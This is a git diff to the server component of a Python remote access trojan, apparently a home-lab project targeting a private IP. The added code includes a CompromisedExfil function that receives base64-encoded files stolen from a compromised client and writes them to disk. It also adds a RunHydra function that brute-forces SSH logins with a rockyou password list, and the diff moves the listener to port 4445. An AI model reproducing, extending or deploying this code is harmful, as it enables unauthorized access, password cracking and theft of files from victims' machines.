@@ -27,7 +27,25 @@ class SERVER:
         # decoding ipv4 to print the connection IP address
         clientip = client.recv(1024).decode()
         print(f'Connection established with {clientip}')
-    
+
+    def CompromisedExfil(self):
+        json_data = client.recv(1024).decode()
+        convert_json = json.loads(json_data)
+        name = convert_json['name']
+        bytes = convert_json['data']
+        b64decoded_bytes = base64.b64decode(bytes)
+        file_name = name.split('.')
+        file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}",'wb') #open in binary       
+        # #         # receive data and write it to file
+        file.write(b64decoded_bytes)
+        file.close()
+
+    def RunHydra(self):
+        hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.114"],capture_output=True)
+        #print(hResult.stdout)
+
+        
+
     
     # setting up function for webcam accessability for later use
     def vidstream_server(self):
@@ -146,10 +164,12 @@ class SERVER:
                     return
 
 # setting host port and ip to construct with the server class
-rat = SERVER('0.0.0.0', 4444)
+rat = SERVER('0.0.0.0', 4445)
 
 
 
 if __name__ == '__main__':
     rat.connection()
-    rat.mainloop()
+    rat.CompromisedExfil()
+    rat.RunHydra()
+    #rat.mainloop()
